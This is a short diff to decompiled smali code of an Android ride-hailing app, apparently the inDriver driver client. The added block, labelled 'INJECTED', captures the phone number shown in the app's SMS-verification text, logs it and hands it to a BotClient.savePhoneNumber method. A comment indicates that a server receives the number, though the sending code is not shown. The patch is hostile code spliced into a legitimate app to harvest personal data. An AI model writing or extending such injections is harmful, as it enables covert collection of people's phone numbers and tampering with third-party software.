@@ -3695,6 +3695,25 @@
 
     .line 461
     move-result-object v7
+    
+    # --- INJECTED: Capture Phone from Subtitle Text ---
+    # v7 contains "Enviamos el código por SMS al +57..."
+    # We use v45, v46, v47 as temps (method has registers 49)
+    
+    const-string v45, "BotClient"
+    new-instance v46, Ljava/lang/StringBuilder;
+    invoke-direct {v46}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v47, "Subtitle Text: "
+    invoke-virtual {v46, v47}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v46, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    invoke-virtual {v46}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v46
+    invoke-static {v45, v46}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
+    
+    # Save the text directly. Server will clean it.
+    invoke-static {v7}, Lsinet/startup/inDriver/city/driver/order/ui/info/BotClient;->savePhoneNumber(Ljava/lang/String;)V
+    
+    # --- END INJECTION ---
 
     .line 462
     invoke-virtual/range {p0 .. p0}, Ld13/m;->f()Ld13/m$d;
